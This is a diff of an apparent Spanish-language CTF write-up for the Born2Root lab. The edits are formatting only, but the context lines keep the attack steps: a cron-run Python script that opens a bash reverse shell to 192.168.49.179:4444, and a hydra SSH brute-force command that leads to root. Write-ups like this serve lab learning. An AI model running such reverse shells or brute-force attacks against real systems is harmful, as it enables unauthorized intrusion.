@@ -45,13 +45,13 @@ Path: `http://192.168.179.49/icons/`
 ### Usuario jimmy (tarea cron)
 
 ```
-martin@debian:/tmp$ cat /tmp/sekurity.py 
+martin@debian:/tmp$ cat /tmp/sekurity.py
 #!/usr/bin/python
 import os
 os.system("bash -c 'bash -i >& /dev/tcp/192.168.49.179/4444 0>&1'")
 ```
 
-![jimmy](/assets/imgs/born2root/icon.png)
+![jimmy](/assets/imgs/born2root/jimmy.png)
 
 
 ## Usuario hady (fuerza bruta ssh)
@@ -68,7 +68,7 @@ hydra -l hadi -P hadi.txt 192.168.179.49 ssh -f -V -t 20
 
 ```
 hadi@debian:~$ su
-Password: 
+Password:
 root@debian:/home/hadi# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
